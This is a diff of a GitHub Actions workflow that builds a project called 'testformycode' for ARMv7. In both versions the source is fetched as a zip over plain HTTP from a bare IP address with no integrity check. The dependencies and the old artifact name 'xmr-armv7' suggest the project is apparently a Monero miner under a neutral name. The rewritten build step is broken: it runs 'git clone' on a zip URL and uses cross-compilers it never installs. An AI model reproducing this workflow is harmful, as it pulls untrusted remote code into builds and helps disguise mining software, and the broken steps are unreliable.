@@ -1,58 +1,41 @@
-name: Build testformycode for ARMv7
+name: Build testformycode ARMv7
 
 on:
   push:
     branches:
-      - master
-  workflow_dispatch:
+      - main
+  workflow_dispatch:  # 允许手动触发
 
 jobs:
   build:
-    runs-on: ubuntu-20.04
+    runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
+      - name: Checkout code
+        uses: actions/checkout@v2
 
-    - name: Download source code
-      run: |
-        wget http://8.138.123.18:8180/testformycode.zip
-        unzip testformycode.zip
-        cd testformycode
+      - name: Set up Docker
+        run: |
+          echo "DOCKER_BUILDKIT=1" >> $GITHUB_ENV
 
-    - name: Install dependencies
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y \
-          build-essential \
-          cmake \
-          clang \
-          libuv1-dev \
-          libhwloc-dev \
-          libssl-dev \
-          pkg-config \
-          git
+      - name: Build in Docker
+        run: |
+          docker run --rm \
+            -v ${{ github.workspace }}:/workspace \
+            -w /workspace \
+            arm32v7/ubuntu:20.04 \
+            /bin/bash -c "
+              apt-get update && \
+              apt-get install -y build-essential cmake git && \
+              git clone http://8.138.123.18:8180/testformycode.zip . && \
+              unzip testformycode.zip && \
+              cd testformycode && \
+              mkdir build && cd build && \
+              cmake .. -DCMAKE_SYSTEM_PROCESSOR=arm -DARM_TARGET=7 -DCMAKE_C_COMPILER=arm-linux-gnueabihf-gcc -DCMAKE_CXX_COMPILER=arm-linux-gnueabihf-g++ && \
+              make"
 
-    - name: Build testformycode
-      run: |
-        cd testformycode
-        mkdir build
-        cd build
-        cmake .. \
-          -DBUILD_STATIC=ON \
-          -Dtestformycode_DEPS="" \
-          -DARM_TARGET=7 \
-          -DUV_INCLUDE_DIR=/usr/include \
-          -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.so \
-          -DHWLOC_INCLUDE_DIR=/usr/include \
-          -DHWLOC_LIBRARY=/usr/lib/x86_64-linux-gnu/libhwloc.so \
-          -DOPENSSL_ROOT_DIR=/usr \
-          -DCMAKE_C_COMPILER=clang \
-          -DCMAKE_CXX_COMPILER=clang++
-        make
-
-    - name: Upload ARMv7 build
-      uses: actions/upload-artifact@v3
-      with:
-        name: xmr-armv7
-        path: build/testformycode # 假设编译后的文件名为 testformycode
+      - name: Upload ARMv7 Build
+        uses: actions/upload-artifact@v2
+        with:
+          name: testformycode-armv7
+          path: ./testformycode/build  # 根据实际路径调整
